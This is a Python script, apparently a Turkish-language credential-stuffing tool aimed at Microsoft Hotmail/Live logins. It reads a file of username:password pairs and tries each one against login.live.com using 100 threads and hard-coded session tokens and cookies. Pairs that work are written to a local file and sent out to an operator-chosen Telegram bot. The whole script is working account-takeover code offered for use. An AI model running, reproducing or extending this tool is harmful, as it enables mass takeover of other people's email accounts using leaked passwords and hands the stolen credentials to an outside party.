import requests
import os
from concurrent.futures import ThreadPoolExecutor, as_completed

E='\033[1;31m';Y='\033[1;33m';Z='\033[1;31m';X='\033[1;33m';Z1='\033[2;31m';F='\033[2;32m';A='\033[2;34m';C='\033[2;35m';S='\033[2;36m';G='\033[1;34m';HH='\033[1;34m';M='\x1b[1;37m'



logo = '''\x1b[1;36m .&dkl`,ivne._
                      sRfkgvc+rsnmGBND.
                    aHBNLbni+.irumLGNMms
                    NRIr`'+dLKNMFb`'iNQr
                   `ANWM7    `+lM0.  `'^Kl
                   iNWL*_;=e.     Y._,_ ON
                   aRNm   _.l,    j^ _` Bq,
                   eNL:,l=N0`.   ls`N0> ibK
                   XHZu!       _(c      kPBN
                    'CD   .     `      tK7KX
                      'f     _&zrc_.  .Y
 ,                      v,   `ta.="  ,V
7q. 6%                   ^l     =   .r
f'noib. +                `d+   .._a7                     t
k+RD6 L.dr                h'  `*+iPb                  .f adI`
dj+Ggr 4NJb            .,dT     `'KJc                 _ir+4b .
  `cl^ ._ tk.   .,&;:rf"t&;       'yIKbr;.         dp` luhrZti
     `~.  ^_T `ysf'      " n,     7     *lkr,.   i7k._m.JKiV"
        J  .H dY   `"-              ._``    "VK,4=   . Kdj`
        K   K B               -s&.            eJ+  .ys7^`
        T   lLj                               (C' .4
        P   'y    .,                      .   +j  7
       ,y   b,     l          .`         ,t   Y`  Y
       4`    i     J`         g,         ti  .l   k
       Y     G    p"  -                -  "i`J    p
       L     .~  74. `W`              '`W  9+y    b.
       N       .Y 6s,     _.      ..      ;T;     gl
       A       y   *Yf+:'`        `^*:pfjVK+i     tb
        Y.   j"     K                  .J`X.f     ly
         Tj V       T.                 il .Vj    .j'
          +'        fi                 J`   L.   y
                    'y        -       .Y     Yz,V
                    .7        .       'A       +
                   .V        ,i        Tj
                  xY         fG         ki
                 tl                      K.
                 K                        Jb
                ,I                        zH
                T                          I
                K                           N
               iU                   .`      P.
               V       `.   _7_`  _^        Rg
              .B          `dJNMHb^          dl
              rG            'YKB`           d'
              ls             `T;            f
              'MWMNBKbri++    Y            il '`""""'''


hit = 0
bad = 0
factor = 0

token = input('\x1b[1;36m â¢ Telegram Token :  ')
print("\x1b[1;39mâ"*60)
id = input('\x1b[1;32m â¢ Telegram Ä°D : ')
print("\x1b[1;39mâ"*60)



def hotmail_tool(username, password):
    global hit, bad, factor
    url = "https://login.live.com/ppsecure/post.srf"
    params = {
    "username": username,
    "client_id": "81feaced-5ddd-41e7-8bef-3e20a2689bb7",
    "contextid": "CB8FF462A1ED2E9E",
    "opid": "5B62766A3DB12172",
    "bk": "1707331891",
    "uaid": "22eb17f4436d499295415de120e3254b",
    "pid": "15216"
    }
    data = {
    "i13": "0",
    "login": username,
    "loginfmt": username,
    "type": "11",
    "LoginOptions": "3",
    "passwd": password,
    "ps": "2",
    "PPFT": "-Digys3SwTVzWkdfuLeqNyvrqsDav35RZe08AjFggfRs448wpr5xKfDFyLlPVceGaUdq0cj9x05ACf3sSeps3E2nPkSmMd9L7KQUERLeNFfGfkrb5nsTH8mDxirvrdBeR6CvwdFaC!7mMQQDUm6b7*u3AF7u6f!IOOcPNRA3pBpt0S5uT8hN8nX8Xy4NcdSnF5w$$",
    "PPSX": "Pa",
    "NewUser": "1",
    "fspost": "0",
    "CookieDisclosure": "0",
    "IsFidoSupported": "0",
    "isSignupPost": "0",
    "isRecoveryAttemptPost": "0",
    "i19": "12498"
    }
    headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
    "Pragma": "no-cache",
    "Accept": "*/*",
    "Host": "login.live.com",
    "Cookie": "MSPOK=$uuid-6100e6c1-0cc5-4c25-9e8f-b179e69d86b7; OParams=11O.DvXjL5aIUZlMq131SruZGhxgrjnTeTls03PVPMhZLUzcmxe0xYm31hxg7a8xDBxkhESW*VIs5D*cziejKpDPsoMm7KGlt!srR7wjkK9pxU5nD7gs8PhMRCI!NKPaS0IwKlNw3EjYsL6HaErddA7B3oHFI4D4tBlj*FE1KzOYcIMAnI1D5dCiy96bz0TGzMFnMMuhNhSCu0nbh3axIT1VFusHpio*ztpTUIa6V4RN*GP!swiAbbCBphYf7YISIR6y4w*P8vhPn4dfQluBA6eftHn6Uw1ovIg2R3f19KXDgwnIwmnKN0yq1FPGAHTVHKNRKFCUCFJKMZZRWyfGgpWMPu1ZBf!syV5cSCihZk4QGuA29pz87iJjWKLvm*lIpL5xyWFE7AVIrSSJ86gh1YY4Y0O!JsVbI7J*kABKRiE2cGCPMiBkUT2g3!UX6XDAImzYGVNMCPzqhE78AonT0eJP1LbaUVad4F0hDoEu7CbiaFKdzvMFopE1z56bg7fg1Fh1sjDcBOnWvAZbvEIq2Iodp63jKkxYzTooidyT312TJTJ8O3oIOzHuPctGtGx66O0FHXVezAHq8!VHjQq7hI2u5r*DpuKHgLk1lmAF00x3juYi*tJeUiP8cIAaB!HrehejZDEsv1BOMhyGC4xslT2Epbkb2AfR8g4pLslIn1nsAKwUI02LXvjtIHzAZlhqCDabtCoMGxQDLcAZBJl7aTA8DhYVoIYId934HIz3ZrDVp!gQ0!DgQyoOL3KVwX7FDQeX5wmXok1F9vXbgs6A8lJ4rarnWiCPIZeZm03NLUR0r9nXbzQdiBZ5Vg3Ibfz3pyBbwZhxgOeJGI*Xdvin*WtAYCf4ho7!zVeI4UjlZ1d6ddacNL8YfMZCBiCBAeDou4onHf8kCFtljbGi5sGCJ8mQ7nUEMbMkurCd!ofkQwOrkzibDoXEayKONl0QERp9DNk!jUxOwR50Wzux!WL8tvne!2C0zlYo!BEpVKEOMtyrhG8Rr4gbwnZDRZOi*heqxW5IczU2s29S6jg3rDepqT8NjV4kJdasgXgCIsNSuH35deaxU5*LxdI5A3UmI6gDsdYemnQcGMXs04yR5C4lVTlNolacXH2iuDdqA*1a73JVvHAuH6N3P8Vmqj96yJAGFQofVYFHhynF9RxZzyWSIJRj1HqMRA3ndWBDdnkFp4YzCFjl*9flkkRB6!mrK0tARcZam3OVt4!aikFnfHTEh*#M#GbWLmpOSszmadreMRBokyoeYY7N*sXnTB9LkCwHgQf!u!rU5HK8JWJh!oTCJljKV20TmgtOLCdmS!U9rAHaufnjRt5HxTTle6C3at7a*#Am4VpjWH7eVibqWV6oLQh9hU!qHNkvrZ7B7lT4N67nHT5TIQh74eukO3fnY1tJDBDcUyhRbcIXtwFuI1xI5QNlnlqQtqvuP8QZtSzYw9QJS3DJsSN;"
    }

    response = requests.post(url, params=params, data=data, headers=headers)
    if "sSigninName" in response.text:
        hit += 1
        os.system('cls' if os.name == 'nt' else 'clear')
        print(logo)
        print(f"\r  o   {F} Hit  {hit}: {M}  ~ {Z} KÃ¶tÃ¼ {bad}: {M}  ~ {X}  FaktÃ¶r : {factor}: {M}  {G} @t5omas\r")
        hit_post = f'''
ðð´ð¶ð¶ðððð ð»ðððð´ð¼ð¿ð
ð¨âââââð©ðððððððªââââââð¨
ð¹ð·ððððð : {username}
ð¹ð·ððððð  : {password}
ð¨âââââð©ðððððððªââââââð¨
ð¹ð·ðððððððð: @T5OMAS @THOMASHACK
'''
        requests.post(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={id}&text="+str((hit_post)))
        with open(f"hit_hot.txt", "a") as file:
            file.write(hit_post + "\n")
    elif "Type = {SQSA: 6, CSS: 5," in response.text:
        bad += 1
        os.system('cls' if os.name == 'nt' else 'clear')
        print(logo)
        print(f"\r  o   {F} Hit  {hit}: {M}  ~ {Z} KÃ¶tÃ¼ {bad}: {M}  ~ {X}  FaktÃ¶r : {factor}: {M}  {F} @t5omas\r")
    elif 'name="ipt" id="ipt"' in response.text:
        factor += 1
        os.system('cls' if os.name == 'nt' else 'clear')
        print(logo)
        print(f"\r  o   {F} Hit  {hit}: {M}  ~ {Z} KÃ¶tÃ¼ {bad}: {M}  ~ {X}  FaktÃ¶r : {factor}: {M}  {F} @t5omas\r")
    else:
        bad += 1
        os.system('cls' if os.name == 'nt' else 'clear')
        print(logo)
        print(f"\r  o   {F} Hit  {hit}: {M}  ~ {Z} KÃ¶tÃ¼ {bad}: {M}  ~ {X}  FaktÃ¶r : {factor}: {M}  {F} @t5omas\r")





#
     #
          # @t5omas
          
def thomas(bilgi):
    try:
        username = bilgi.split(":")[0]
        password = bilgi.split(":")[1]
        hotmail_tool(username, password)
    except Exception as p:
        print(f" Hata: {p}")
combo = input(' \x1b[1;33m  - Combo  : ')  
try:
    with open(combo, 'r') as f:
        dosya_ac = f.readlines()
except FileNotFoundError:
    print(f"Dosya bulunamadÄ± â {combo}")
    exit()
with ThreadPoolExecutor(max_workers=100) as executor:
    futures = [executor.submit(thomas, bilgi.strip()) for bilgi in dosya_ac]
    for future in as_completed(futures):
        try:
            future.result()
        except Exception as he:
            print(f"â Hata: {he}")
print(" h ")
